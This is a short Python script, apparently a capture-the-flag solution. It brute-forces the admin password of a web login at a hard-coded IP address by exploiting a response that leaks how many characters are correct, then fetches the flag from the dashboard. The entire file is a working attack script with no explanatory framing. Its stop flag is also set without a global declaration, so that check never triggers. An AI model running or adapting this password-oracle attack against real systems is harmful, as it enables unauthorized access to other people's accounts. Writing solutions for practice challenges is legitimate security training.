from urllib.parse import urljoin
import re
import string

import requests

BASE_URL = "http://52.59.124.14:5015/"
LOGIN_URL = urljoin(BASE_URL, "login.php")
DASHBOARD_URL = urljoin(BASE_URL, "dashboard.php")
USERNAME = "admin"

CHARSET = string.ascii_letters + string.digits
FOUND = False


def try_password(s, prefix):
    for c in CHARSET:
        attempt = prefix + c
        data = {"username": USERNAME, "password": attempt}
        r = s.post(LOGIN_URL, data=data)
        
        if "Invalid password, but you got" in r.text:
            correct = int(r.text.split("you got ")[1].split(" characters")[0])
            if correct > len(prefix):
                return attempt
        elif "dashboard.php" in r.url:
            FOUND = True
            return attempt
    return None

def recover_password(s):
    password = ""
    while not FOUND:
        result = try_password(s, password)
        if result is None:
            break
        password = result
        print(f"[+] Password updated: {password}")
    return password

if __name__ == "__main__":
    s = requests.Session()
    final_password = recover_password(s)
    print(f"[+] Final password: {final_password}")
    r = s.get(DASHBOARD_URL)
    print(re.search("ENO\{[^\}]+\}", r.text).group())
